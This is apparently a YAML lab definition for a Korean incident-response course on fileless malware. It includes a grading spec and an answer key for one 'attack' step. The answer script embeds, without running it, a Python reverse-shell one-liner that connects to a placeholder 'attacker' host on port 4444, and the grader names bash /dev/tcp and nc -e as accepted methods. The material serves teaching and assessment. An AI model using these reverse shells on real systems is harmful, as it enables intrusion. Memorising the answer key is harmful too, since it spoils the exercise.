lab_id: agent-ir-adv-nonai-week09
title: Fileless 악성코드 IR (Non-AI)
version: nonai
course: agent-ir-adv-nonai
week: 9
description: LOLBin·Reflective Load·인터프리터. Memory forensics + AppLocker·WDAC. 학생이 수동 수행·기록.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 리버스 셸 원라이너 (교육)
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''

    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
  answer_detail: '[공격] 실제 연결 없는 교육 버전.'
  verify:
    type: output_contains
    expect: simulated
    field: stdout
    semantic:
      intent: '[공격] 리버스 셸 — cat > revshell.py: code = ''python3 -c import socket...s.connect(attacker,4444)''
        simulated. 교육용 실제 연결 없음. MITRE T1059.006.'
      success_criteria:
      - simulated 출력
      - socket.connect
      - 4444 포트
      acceptable_methods:
      - Python socket
      - bash /dev/tcp
      - nc -e
      negative_signs:
      - simulated 아님
      - 실제 연결
      - 포트 없음
  target_vm: web
  script: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''

    # 교육용 — 실제 연결 안 함

    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"

    print(''simulated:'', code)

    PY

    python3 ~/w09/revshell.py'
